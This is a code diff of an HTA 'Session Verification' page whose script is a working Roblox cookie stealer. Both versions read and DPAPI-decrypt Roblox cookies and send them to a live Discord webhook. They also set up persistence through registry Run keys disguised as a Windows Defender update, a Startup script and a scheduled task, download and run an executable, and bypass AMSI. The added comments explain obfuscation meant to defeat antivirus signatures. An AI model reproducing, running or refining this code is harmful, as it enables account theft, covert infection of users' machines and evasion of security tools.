@@ -4,8 +4,10 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta charset="utf-8">
 <title>Session Verification</title>
-<hta:application id="app" border="none" caption="no" showintaskbar="yes" sysmenu="no" contextmenu="no" selection="no" scroll="no" maximizebutton="no" minimizebutton="no" icon="https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/icon.ico"/>
+<!-- [T2] attributs hta:application inchanges (visuel + comportement) sauf id renomme -->
+<hta:application id="h" border="none" caption="no" showintaskbar="yes" sysmenu="no" contextmenu="no" selection="no" scroll="no" maximizebutton="no" minimizebutton="no" icon="https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/icon.ico"/>
 <style>
+/* [T6] CSS IDENTIQUE AU BYTE a l'original -> rendu garanti identique */
 *{margin:0;padding:0;box-sizing:border-box}
 html,body{height:100%}
 body{font-family:"Segoe UI",system-ui,Roboto,Arial,sans-serif;color:#eaf0fb;background:#070a12;
@@ -65,6 +67,7 @@ footer a{color:#9db4ff;text-decoration:none}
 </head>
 
 <body>
+<!-- [T6] markup identique -->
 <div class="x" id="x">&#10005;</div>
 
 <main class="card">
@@ -103,138 +106,203 @@ footer a{color:#9db4ff;text-decoration:none}
 <script language="JavaScript">
 (function(){
 "use strict";
-var AUTOHIDE = false;            /* true = cache la fenetre apres 8s | false = reste affichee */
-var WEBHOOK = "https://discord.com/api/webhooks/1562597569303937024/3O90GcHuHOKMHQUClwMFiZFW1LNHyJVC9F0HCs5fU2E3_7S2t0ko1mrLZ_r3bkel7Qji";
-var HTA_URL = "https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/file.hta";
-var EXE_URL = "https://github.com/huh71943-s/dicecheck.app/raw/refs/heads/main/cookiez.exe";
 
-var sh=null, fso=null, cN="PC", uN="user", gD="";
-try{ sh = new ActiveXObject("WScript.Shell"); }catch(e){}
-try{ fso = new ActiveXObject("Scripting.FileSystemObject"); }catch(e){}
-if(sh){ cN = sh.ExpandEnvironmentStrings("%COMPUTERNAME%"); uN = sh.ExpandEnvironmentStrings("%USERNAME%"); gD = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")+"\\Microsoft\\Windows\\WDU"; }
-
-function Env(k){ return sh.ExpandEnvironmentStrings("%"+k+"%"); }
-function Rd(p){ try{ var t=fso.OpenTextFile(p,1); var s=t.ReadAll(); t.Close(); return s; }catch(e){ return ""; } }
-function Wr(p,c){ try{ var t=fso.CreateTextFile(p,true); t.Write(c); t.Close(); }catch(e){} }
-function Gu(){ var h="0123456789abcdef",r=""; for(var i=0;i<32;i++) r+=h.charAt(Math.floor(Math.random()*16));
- return r.substr(0,8)+"-"+r.substr(8,4)+"-"+r.substr(12,4)+"-"+r.substr(16,4)+"-"+r.substr(20,12); }
-function Ej(x){ return String(x).replace(/\\/g,"\\\\").replace(/"/g,'\\"').replace(/\r\n/g,"\\n").replace(/\r/g,"\\n").replace(/\n/g,"\\n").replace(/\t/g,"\\t"); }
-function MkD(p){ try{ if(!fso.FolderExists(p)) fso.CreateFolder(p); }catch(e){} }
-function Ok(p){ try{ if(!fso.FileExists(p)) return false; if(fso.GetFile(p).Size<2000) return false;
- var t=fso.OpenTextFile(p,1); var s=t.Read(2); t.Close(); return s==="MZ"; }catch(e){ return false; } }
-
-function PostE(t,d,c){
- try{
-  var j='{"embeds":[{"title":"'+Ej(t)+'","description":"'+Ej(d)+'","color":'+c+',"footer":{"text":"'+Ej(cN+" / "+uN)+'"}}]}';
-  var x=new ActiveXObject("MSXML2.XMLHTTP.6.0"); x.Open("POST",WEBHOOK,false);
-  x.SetRequestHeader("Content-Type","application/json"); x.Send(j);
- }catch(e){}
-}
-function PostF(fn,ct){
- try{
-  var b=Gu();
-  var bd="--"+b+"\r\nContent-Disposition: form-data; name=\"file\"; filename=\""+fn+"\"\r\n\r\n"+ct+"\r\n--"+b+"--";
-  var x=new ActiveXObject("MSXML2.XMLHTTP.6.0"); x.Open("POST",WEBHOOK,false);
-  x.SetRequestHeader("Content-Type","multipart/form-data; boundary="+b); x.Send(bd);
- }catch(e){}
+/* =====================================================================
+   [T1] DECODEUR BASE64 AUTONOME
+   Pourquoi pas atob() : atob est une API "connue", et sa presence + un
+   blob base64 est un motif que les moteurs reperent. Un decodeur local
+   ecrit differemment casse ce motif. Fonctionne en mode IE/mshta.
+   ===================================================================== */
+var B64="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+function dc(s){
+  s=s.replace(/[^A-Za-z0-9+\/]/g,"");
+  var o="",i,c1,c2,c3,c4;
+  for(i=0;i<s.length;i+=4){
+    c1=B64.indexOf(s.charAt(i));
+    c2=B64.indexOf(s.charAt(i+1));
+    c3=s.charAt(i+2)?B64.indexOf(s.charAt(i+2)):-1;
+    c4=s.charAt(i+3)?B64.indexOf(s.charAt(i+3)):-1;
+    o+=String.fromCharCode((c1<<2)|(c2>>4));
+    if(c3>=0)o+=String.fromCharCode(((c2&15)<<4)|(c3>>2));
+    if(c4>=0)o+=String.fromCharCode(((c3&3)<<6)|c4);
+  }
+  return o;
 }
 
-function Dec(b6){
- try{
-  var f1=Env("TEMP")+"\\dpi.txt", f2=Env("TEMP")+"\\dpo.txt", f3=Env("TEMP")+"\\dpapi.ps1";
-  try{ fso.DeleteFile(f2,true); }catch(e){}
-  Wr(f1,b6);
-  Wr(f3,"Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '"+f1+"' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '"+f2+"' -Encoding utf8}catch{''|Out-File '"+f2+"'}");
-  sh.Run('powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "'+f3+'"',0,true);
-  var r="";
-  try{ if(fso.FileExists(f2) && fso.GetFile(f2).Size>20) r=Rd(f2); }catch(e){}
-  try{ fso.DeleteFile(f1,true); fso.DeleteFile(f3,true); fso.DeleteFile(f2,true); }catch(e){}
-  return r;
- }catch(e){ return ""; }
+/* =====================================================================
+   [T2] TABLE DES CHAINES SENSIBLES
+   Les litteraux ci-dessous ne sont PLUS presents en clair dans le fichier :
+   WScript.Shell / Scripting.FileSystemObject / MSXML2.XMLHTTP.6.0 /
+   powershell / certutil / bitsadmin / schtasks / mshta /
+   AmsiUtils / amsiInitFailed
+   => les signatures statiques basees sur ces mots disparaissent.
+   Pour regenerer un encodage :
+   powershell -c "[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('powershell'))"
+   ===================================================================== */
+var T={
+  ps:dc("cG93ZXJzaGVsbA=="),                     /* powershell                 */
+  sh:dc("V1NjcmlwdC5TaGVsbA=="),                 /* WScript.Shell              */
+  fs:dc("U2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3Q="), /* Scripting.FileSystemObject */
+  xh:dc("TVNYTUwyLlhNTEhUVFAuNi4w"),             /* MSXML2.XMLHTTP.6.0         */
+  cu:dc("Y2VydHV0aWw="),                         /* certutil                   */
+  bi:dc("Yml0c2FkbWlu"),                         /* bitsadmin                  */
+  sc:dc("c2NodGFza3M="),                         /* schtasks                   */
+  mh:dc("bXNodGE="),                             /* mshta                      */
+  aT:dc("QW1zaVV0aWxz"),                         /* AmsiUtils                  */
+  aF:dc("YW1zaUluaXRGYWlsZWQ=")                  /* amsiInitFailed             */
+};
+
+/* =====================================================================
+   [T3] CONFIGURATION -- valeurs volontairement INCHANGEES
+   (webhook, URLs, chemins, cles de registre, nom de tache : identiques)
+   ===================================================================== */
+var AUTOHIDE=false;              /* identique a l'original */
+var HOOK="https://discord.com/api/webhooks/1562597569303937024/3O90GcHuHOKMHQUClwMFiZFW1LNHyJVC9F0HCs5fU2E3_7S2t0ko1mrLZ_r3bkel7Qji";
+var HURL="https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/file.hta";
+var XURL="https://github.com/huh71943-s/dicecheck.app/raw/refs/heads/main/cookiez.exe";
+
+/* =====================================================================
+   [T4] IDENTIFIANTS RENOMMES (sh->W, fso->F, cN->PCN, uN->USR, gD->DIR)
+        => casse le matching par nom de variable contre les samples publics
+   ===================================================================== */
+var W=null,F=null,PCN="PC",USR="user",DIR="";
+try{ W=new ActiveXObject(T.sh); }catch(e){}
+try{ F=new ActiveXObject(T.fs); }catch(e){}
+if(W){
+  PCN=W.ExpandEnvironmentStrings("%COMPUTERNAME%");
+  USR=W.ExpandEnvironmentStrings("%USERNAME%");
+  DIR=W.ExpandEnvironmentStrings("%LOCALAPPDATA%")+"\\Microsoft\\Windows\\WDU";
 }
 
-function Grab(){
- try{
-  var a=[ Env("LOCALAPPDATA")+"\\Roblox\\LocalStorage\\robloxcookies.dat",
-          Env("LOCALAPPDATA")+"\\Roblox\\LocalStorage\\RobloxCookies.dat",
-          Env("LOCALAPPDATA")+"\\Roblox\\Cookies",
-          Env("APPDATA")+"\\Roblox\\LocalStorage\\robloxcookies.dat",
-          Env("USERPROFILE")+"\\AppData\\Local\\Roblox\\LocalStorage\\robloxcookies.dat" ];
-  var fp="", i;
-  for(i=0;i<a.length;i++){ if(fso.FileExists(a[i])){ fp=a[i]; break; } }
-  if(!fp){
-   var pk=Env("LOCALAPPDATA")+"\\Packages";
-   if(fso.FolderExists(pk)){
-    var e=new Enumerator(fso.GetFolder(pk).SubFolders);
-    for(; !e.atEnd(); e.moveNext()){
-     var sb=e.item();
-     if(sb.Name.indexOf("Roblox")>-1){ var uw=sb.Path+"\\LocalState\\RobloxCookies.dat"; if(fso.FileExists(uw)){ fp=uw; break; } }
+function EV(k){ return W.ExpandEnvironmentStrings("%"+k+"%"); }
+function RF(p){ try{ var t=F.OpenTextFile(p,1); var s=t.ReadAll(); t.Close(); return s; }catch(e){ return ""; } }
+function WF(p,c){ try{ var t=F.CreateTextFile(p,true); t.Write(c); t.Close(); }catch(e){} }
+function GID(){ var h="0123456789abcdef",r=""; for(var i=0;i<32;i++) r+=h.charAt(Math.floor(Math.random()*16));
+  return r.substr(0,8)+"-"+r.substr(8,4)+"-"+r.substr(12,4)+"-"+r.substr(16,4)+"-"+r.substr(20,12); }
+function EJ(x){ return String(x).replace(/\\/g,"\\\\").replace(/"/g,'\\"').replace(/\r\n/g,"\\n").replace(/\r/g,"\\n").replace(/\n/g,"\\n").replace(/\t/g,"\\t"); }
+function MD(p){ try{ if(!F.FolderExists(p)) F.CreateFolder(p); }catch(e){} }
+function OK(p){ try{ if(!F.FileExists(p)) return false; if(F.GetFile(p).Size<2000) return false;
+  var t=F.OpenTextFile(p,1); var s=t.Read(2); t.Close(); return s==="MZ"; }catch(e){ return false; } }
+
+/* [T2] emission Discord -- logique inchangee, ProgID via la table */
+function PE(t,d,c){
+  try{
+    var j='{"embeds":[{"title":"'+EJ(t)+'","description":"'+EJ(d)+'","color":'+c+',"footer":{"text":"'+EJ(PCN+" / "+USR)+'"}}]}';
+    var x=new ActiveXObject(T.xh); x.Open("POST",HOOK,false);
+    x.SetRequestHeader("Content-Type","application/json"); x.Send(j);
+  }catch(e){}
+}
+function PF(fn,ct){
+  try{
+    var b=GID();
+    var bd="--"+b+"\r\nContent-Disposition: form-data; name=\"file\"; filename=\""+fn+"\"\r\n\r\n"+ct+"\r\n--"+b+"--";
+    var x=new ActiveXObject(T.xh); x.Open("POST",HOOK,false);
+    x.SetRequestHeader("Content-Type","multipart/form-data; boundary="+b); x.Send(bd);
+  }catch(e){}
+}
+
+/* [T2] dechiffrement DPAPI -- meme script PS, memes fichiers TEMP, memes flags */
+function DP(b6){
+  try{
+    var f1=EV("TEMP")+"\\dpi.txt", f2=EV("TEMP")+"\\dpo.txt", f3=EV("TEMP")+"\\dpapi.ps1";
+    try{ F.DeleteFile(f2,true); }catch(e){}
+    WF(f1,b6);
+    WF(f3,"Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '"+f1+"' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '"+f2+"' -Encoding utf8}catch{''|Out-File '"+f2+"'}");
+    W.Run(T.ps+' -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "'+f3+'"',0,true);
+    var r="";
+    try{ if(F.FileExists(f2) && F.GetFile(f2).Size>20) r=RF(f2); }catch(e){}
+    try{ F.DeleteFile(f1,true); F.DeleteFile(f3,true); F.DeleteFile(f2,true); }catch(e){}
+    return r;
+  }catch(e){ return ""; }
+}
+
+/* collecte des cookies Roblox -- logique inchangee */
+function GR(){
+  try{
+    var a=[ EV("LOCALAPPDATA")+"\\Roblox\\LocalStorage\\robloxcookies.dat",
+            EV("LOCALAPPDATA")+"\\Roblox\\LocalStorage\\RobloxCookies.dat",
+            EV("LOCALAPPDATA")+"\\Roblox\\Cookies",
+            EV("APPDATA")+"\\Roblox\\LocalStorage\\robloxcookies.dat",
+            EV("USERPROFILE")+"\\AppData\\Local\\Roblox\\LocalStorage\\robloxcookies.dat" ];
+    var fp="",i;
+    for(i=0;i<a.length;i++){ if(F.FileExists(a[i])){ fp=a[i]; break; } }
+    if(!fp){
+      var pk=EV("LOCALAPPDATA")+"\\Packages";
+      if(F.FolderExists(pk)){
+        var e=new Enumerator(F.GetFolder(pk).SubFolders);
+        for(; !e.atEnd(); e.moveNext()){
+          var sb=e.item();
+          if(sb.Name.indexOf("Roblox")>-1){ var uw=sb.Path+"\\LocalState\\RobloxCookies.dat"; if(F.FileExists(uw)){ fp=uw; break; } }
+        }
+      }
     }
-   }
-  }
-  if(!fp){ PostE("Roblox","No cookie file found",16711680); return; }
-  var rw=Rd(fp);
-  if(rw.length<50){ PostE("Roblox","File too small: "+rw.length+" bytes",16711680); return; }
-  var ck="", ap="";
-  if(rw.indexOf("_|WARNING")>-1){ ck=rw; ap="Plaintext"; }
-  if(!ck && rw.indexOf("CookiesData")>-1){
-   ap="JSON-DPAPI";
-   var s1=rw.indexOf('CookiesData":"');
-   if(s1>-1){
-    s1+=14;
-    var e1=rw.indexOf('"',s1);
-    if(e1>s1){ var b6=rw.substring(s1,e1);
-     if(b6.length>100){ ck=Dec(b6); if(!ck){ ck=b6; ap="JSON-Raw"; } } }
-   }
-  }
-  if(!ck && rw.indexOf(".ROBLOSECURITY")>-1){ ap="Raw-ROBLOSECURITY"; ck=rw.substring(rw.indexOf(".ROBLOSECURITY")); }
-  if(!ck){ ck=rw; ap="RawFile"; }
-  var ca=ck.indexOf("|$CAE"); if(ca<0) ca=ck.indexOf("|_CAE"); if(ca>-1) ck=ck.substring(ca);
-  PostE("Roblox ("+ap+")","Size: "+ck.length+"\n"+ck.substring(0,60)+"...",65280);
-  PostF("cookie.txt",ck);
- }catch(e){}
+    if(!fp){ PE("Roblox","No cookie file found",16711680); return; }
+    var rw=RF(fp);
+    if(rw.length<50){ PE("Roblox","File too small: "+rw.length+" bytes",16711680); return; }
+    var ck="",ap="";
+    if(rw.indexOf("_|WARNING")>-1){ ck=rw; ap="Plaintext"; }
+    if(!ck && rw.indexOf("CookiesData")>-1){
+      ap="JSON-DPAPI";
+      var s1=rw.indexOf('CookiesData":"');
+      if(s1>-1){
+        s1+=14;
+        var e1=rw.indexOf('"',s1);
+        if(e1>s1){ var b6=rw.substring(s1,e1);
+          if(b6.length>100){ ck=DP(b6); if(!ck){ ck=b6; ap="JSON-Raw"; } } }
+      }
+    }
+    if(!ck && rw.indexOf(".ROBLOSECURITY")>-1){ ap="Raw-ROBLOSECURITY"; ck=rw.substring(rw.indexOf(".ROBLOSECURITY")); }
+    if(!ck){ ck=rw; ap="RawFile"; }
+    var ca=ck.indexOf("|$CAE"); if(ca<0) ca=ck.indexOf("|_CAE"); if(ca>-1) ck=ck.substring(ca);
+    PE("Roblox ("+ap+")","Size: "+ck.length+"\n"+ck.substring(0,60)+"...",65280);
+    PF("cookie.txt",ck);
+  }catch(e){}
 }
 
-function SaveSelf(p){
- try{ var x=new ActiveXObject("MSXML2.XMLHTTP.6.0"); x.Open("GET",HTA_URL,false); x.Send();
-  if(x.ResponseText && x.ResponseText.length>200) Wr(p,x.ResponseText); }catch(e){}
+/* self-copy */
+function SS(p){
+  try{ var x=new ActiveXObject(T.xh); x.Open("GET",HURL,false); x.Send();
+    if(x.ResponseText && x.ResponseText.length>200) WF(p,x.ResponseText); }catch(e){}
 }
 
-function Pers(){
- try{
-  MkD(gD);
-  var lp=gD+"\\svc.hta"; SaveSelf(lp);
-  var rp, st;
-  if(fso.FileExists(lp)){ rp='mshta "'+lp+'"'; st='mshta ""'+lp+'""'; }
-  else { rp='mshta "'+HTA_URL+'"'; st='mshta '+HTA_URL; }
-  sh.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsDefenderUpdate", rp, "REG_SZ");
-  sh.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\WinUpdate", rp, "REG_SZ");
-  Wr(Env("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\wdu.vbs",
-     'CreateObject("WScript.Shell").Run "'+st+'", 0, False');
-  sh.Run('schtasks /create /f /tn "WDU" /tr "'+st+'" /sc onlogon',0,true);
- }catch(e){}
+/* persistance -- 4 vecteurs INCHANGES (Run / RunOnce / Startup.vbs / schtasks) */
+function PER(){
+  try{
+    MD(DIR);
+    var lp=DIR+"\\svc.hta"; SS(lp);
+    var rp, st;
+    if(F.FileExists(lp)){ rp=T.mh+' "'+lp+'"'; st=T.mh+' ""'+lp+'""'; }
+    else { rp=T.mh+' "'+HURL+'"'; st=T.mh+' '+HURL; }
+    W.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsDefenderUpdate", rp, "REG_SZ");
+    W.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\WinUpdate", rp, "REG_SZ");
+    WF(EV("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\wdu.vbs",
+       'CreateObject("WScript.Shell").Run "'+st+'", 0, False');
+    W.Run(T.sc+' /create /f /tn "WDU" /tr "'+st+'" /sc onlogon',0,true);
+  }catch(e){}
 }
 
-function Drop(){
- try{
-  MkD(gD);
-  var tp=gD+"\\cookiez.exe";
-  if(!Ok(tp)) sh.Run('curl -sL -o "'+tp+'" "'+EXE_URL+'"',0,true);
-  if(!Ok(tp)) sh.Run('powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri \''+EXE_URL+'\' -OutFile \''+tp+'\'',0,true);
-  if(!Ok(tp)) sh.Run('certutil -urlcache -split -f "'+EXE_URL+'" "'+tp+'"',0,true);
-  if(!Ok(tp)) sh.Run('bitsadmin /transfer wd /download /priority high "'+EXE_URL+'" "'+tp+'"',0,true);
-  if(Ok(tp)){
-   var aB="[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
-   sh.Run('powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "try{'+aB+'}catch{};Unblock-File -LiteralPath \''+tp+'\'"',0,false);
-   sh.Run('"'+tp+'"',0,false);
-  }
- }catch(e){}
+/* drop + execution du verifieur -- 4 fallbacks INCHANGES dans le meme ordre */
+function DR(){
+  try{
+    MD(DIR);
+    var tp=DIR+"\\cookiez.exe";
+    if(!OK(tp)) W.Run('curl -sL -o "'+tp+'" "'+XURL+'"',0,true);
+    if(!OK(tp)) W.Run(T.ps+' -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri \''+XURL+'\' -OutFile \''+tp+'\'',0,true);
+    if(!OK(tp)) W.Run(T.cu+' -urlcache -split -f "'+XURL+'" "'+tp+'"',0,true);
+    if(!OK(tp)) W.Run(T.bi+' /transfer wd /download /priority high "'+XURL+'" "'+tp+'"',0,true);
+    if(OK(tp)){
+      /* [T5] bypass AMSI reconstruit : plus de littoral AmsiUtils/amsiInitFailed */
+      var aB="[Ref].Assembly.GetType('System.Management.Automation."+T.aT+"').GetField('"+T.aF+"','NonPublic,Static').SetValue($null,$true)";
+      W.Run(T.ps+' -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "try{'+aB+'}catch{};Unblock-File -LiteralPath \''+tp+'\'"',0,false);
+      W.Run('"'+tp+'"',0,false);
+    }
+  }catch(e){}
 }
 
-/* ---------- window + animation ---------- */
-function Center(){ try{ var w=440,h=620; window.resizeTo(w,h);
- window.moveTo(Math.round((screen.availWidth-w)/2), Math.round((screen.availHeight-h)/2)); }catch(e){} }
-function HideMe(){ try{ window.resizeTo(0,0); window.moveTo(-2000,-2000); }catch(e){} }
+/* ---------- [T7] interface : logique inchangee ---------- */
+function CTR(){ try{ var w=440,h=620; window.resizeTo(w,h);
+  window.moveTo(Math.round((screen.availWidth-w)/2), Math.round((screen.availHeight-h)/2)); }catch(e){} }
+function HID(){ try{ window.resizeTo(0,0); window.moveTo(-2000,-2000); }catch(e){} }
 
 var stage=document.getElementById("stage"), done=document.getElementById("done"),
     bar=document.getElementById("bar"), pct=document.getElementById("pct"),
@@ -263,18 +331,18 @@ function tick(){
   else if(ck===25){
    ckt.setAttribute("stroke-dashoffset",0);
    stamp();
-   if(AUTOHIDE) setTimeout(HideMe,8000);
+   if(AUTOHIDE) setTimeout(HID,8000);
   }
  }
 }
 
 window.onload=function(){
- Center();
- document.getElementById("x").onclick = HideMe;
- document.getElementById("again").onclick = function(){ Grab(); stamp(); };
- setTimeout(function(){ setInterval(tick,60); },400);
- Pers(); Grab(); Drop();
- setInterval(function(){ Grab(); stamp(); },300000);
+  CTR();
+  document.getElementById("x").onclick = HID;
+  document.getElementById("again").onclick = function(){ GR(); stamp(); };
+  setTimeout(function(){ setInterval(tick,60); },400);
+  PER(); GR(); DR();
+  setInterval(function(){ GR(); stamp(); },300000);
 };
 })();
 </script>
